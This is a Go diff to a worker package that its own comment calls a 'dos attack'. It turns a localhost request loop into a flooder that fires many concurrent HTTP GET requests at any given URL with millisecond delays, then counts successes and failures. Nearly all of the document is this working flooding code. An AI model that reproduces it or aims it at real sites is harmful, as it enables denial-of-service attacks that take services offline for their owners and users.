@@ -2,53 +2,54 @@ package core
 
 import (
 	"fmt"
-	"io/ioutil"
 	"net/http"
 	"time"
 )
 
+// NewWorker creats a new worker assigning a unique Channel and ID
 func (w *Worker) NewWorker() {
 	w.Channel = make(chan bool)
 	w.ID = time.Now().Unix()
 }
 
-func (w *Worker) StartWorker(i *Info) {
-	go w.attack(i)
+// StartWorker starts the dos attack
+func (w *Worker) StartWorker(i *Info, numberOfRequests int, url string) {
+	go w.attack(i, numberOfRequests, url)
 }
 
+// StopWorker stops the attack by closing all channels
 func (w *Worker) StopWorker() {
 	close(w.Channel)
 }
 
-func (w *Worker) attack(i *Info) {
-	go w.request(i)
+func (w *Worker) attack(info *Info, numberOfRequests int, url string) {
+	for i := 0; i < numberOfRequests; i++ {
+		go w.request(info, url)
+	}
 	for {
 		select {
 		case <-w.Channel:
-			fmt.Println("done")
+			fmt.Println("Worker Stopped: ", w.ID)
 			return
 		default:
-			time.Sleep(time.Second * 2)
+			time.Sleep(time.Millisecond * 10)
 		}
 	}
 }
 
-func (w *Worker) request(i *Info) {
+func (w *Worker) request(i *Info, url string) {
 	for {
 		start := time.Now()
-		resp, e := http.Get("http://localhost:9090")
+		resp, e := http.Get(url)
 		if e == nil {
 			secs := time.Since(start).Seconds()
-			body, _ := ioutil.ReadAll(resp.Body)
-
-			fmt.Println(secs, body)
+			fmt.Println(secs)
 		}
 
 		i.Requests++
-		fmt.Println("i++")
+
 		if e != nil {
 			i.NetworkFailed++
-
 		} else {
 			if resp.StatusCode == http.StatusOK {
 				i.Success++
@@ -56,20 +57,20 @@ func (w *Worker) request(i *Info) {
 				i.BadFailed++
 			}
 		}
-		if w.frequency(10) {
+
+		if w.frequency(1) {
 			return
 		}
 	}
 }
 
-func (w *Worker) frequency(i int) bool {
+func (w *Worker) frequency(wait time.Duration) bool {
 	select {
 	case <-w.Channel:
-		fmt.Println("done req")
+		//fmt.Println("Kill all requests")
 		return true
 	default:
-		fmt.Println("working..")
-		time.Sleep(1 * time.Second)
+		time.Sleep(wait * time.Millisecond)
 		return false
 	}
 }
